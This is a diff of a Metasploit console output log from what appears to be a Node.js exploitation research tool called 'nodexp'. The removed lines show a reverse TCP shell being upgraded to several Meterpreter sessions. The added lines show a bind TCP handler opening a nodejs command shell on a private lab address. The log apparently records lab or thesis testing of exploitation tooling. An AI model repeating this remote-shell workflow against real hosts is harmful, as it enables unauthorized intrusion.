@@ -1,26 +1,18 @@
-[1m[34m[*][0m Spooling to file /root/Desktop/thesis_final/nodexp_20180816/nodexp/scripts/nodejs_shell.rc.output.txt...
-resource (/root/Desktop/thesis_final/nodexp_20180816/nodexp/scripts/nodejs_shell.rc)> exploit -j -z
+[1m[34m[*][0m Spooling to file /home/kali/PycharmProjects/nodexp/scripts/nodejs_shell.rc.output.txt...
+resource (/home/kali/PycharmProjects/nodexp/scripts/nodejs_shell.rc)> exploit -j -z
 [0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[?1034h[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[1m[34m[*][0m Started bind TCP handler against 192.168.74.148:6565
+[1m[34m[*][0m Command shell session 1 opened (0.0.0.0:0 -> 192.168.74.148:6565) at 2020-06-02 19:34:30 -0400
+sessions -i
+[0m
+Active sessions
+===============
 
-[1m[34m[*][0m Started reverse TCP handler on 192.168.64.128:1234 
-[?1034h[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [1m[34m[*][0m Command shell session 1 opened (192.168.64.128:1234 -> 192.168.64.130:52274) at 2018-08-19 21:43:29 +0300
-[1m[34m[*][0m Session ID 1 (192.168.64.128:1234 -> 192.168.64.130:52274) processing InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter'
-[1m[33m[!][0m SESSION may not be compatible with this module.
-[1m[34m[*][0m Upgrading session ID: 1
-[1m[34m[*][0m Starting exploit/multi/handler
-[1m[34m[*][0m Started reverse TCP handler on 192.168.64.128:4433 
-[1m[34m[*][0m Sending stage (857352 bytes) to 192.168.64.130
-[1m[34m[*][0m Meterpreter session 2 opened (192.168.64.128:4433 -> 192.168.64.130:44988) at 2018-08-19 21:43:30 +0300
-[1m[34m[*][0m Sending stage (857352 bytes) to 192.168.64.130
-[1m[34m[*][0m Meterpreter session 3 opened (192.168.64.128:4433 -> 192.168.64.130:44990) at 2018-08-19 21:43:30 +0300
-[1m[34m[*][0m Sending stage (857352 bytes) to 192.168.64.130
-[1m[34m[*][0m Meterpreter session 4 opened (192.168.64.128:4433 -> 192.168.64.130:44992) at 2018-08-19 21:43:31 +0300
-[1m[34m[*][0m Sending stage (857352 bytes) to 192.168.64.130
-[1m[34m[*][0m Meterpreter session 5 opened (192.168.64.128:4433 -> 192.168.64.130:44994) at 2018-08-19 21:43:32 +0300
-[1m[34m[*][0m Sending stage (857352 bytes) to 192.168.64.130
-[1m[34m[*][0m Meterpreter session 6 opened (192.168.64.128:4433 -> 192.168.64.130:44996) at 2018-08-19 21:43:35 +0300
-[0m[1m[34m[*][0m Command stager progress: 100.00% (773/773 bytes)
-exit -t
-[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
-[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit -t[Ky
+  Id  Name  Type                 Information  Connection
+  --  ----  ----                 -----------  ----------
+  1         shell nodejs/nodejs               0.0.0.0:0 -> 192.168.74.148:6565 (192.168.74.148)
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exit -y
 [0m
